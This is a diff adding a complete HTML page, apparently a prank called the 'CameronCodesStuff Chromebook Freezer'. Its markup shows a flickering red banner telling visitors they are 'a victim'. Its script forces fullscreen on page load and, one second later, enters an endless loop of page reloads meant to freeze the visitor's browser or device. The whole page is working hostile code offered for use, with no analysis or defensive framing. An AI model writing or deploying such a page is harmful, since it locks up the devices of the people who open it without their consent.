@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      background-color: black;
+      color: red;
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    h1 {
+      font-size: 3em;
+      text-shadow: 5px 5px 10px red;
+      animation: flicker 1s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 1; }
+      100% { opacity: 0.5; }
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Welcome, you are now a victim of the CameronCodesStuff Chromebook Freezer</h1>
+
+<script>
+  // Function to request fullscreen
+  function goFullScreen() {
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen();
+    } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+      document.documentElement.mozRequestFullScreen();
+    } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+      document.documentElement.webkitRequestFullscreen();
+    } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+      document.documentElement.msRequestFullscreen();
+    }
+  }
+
+  // Attempt fullscreen when the page loads
+  document.addEventListener("DOMContentLoaded", function() {
+    goFullScreen();
+  });
+
+  // Start infinite reload loop after 1 second
+  setTimeout(function(){
+    while (true) {
+      location.reload(true);
+    }
+  }, 1000);
+</script>
+
+</body>
+</html>
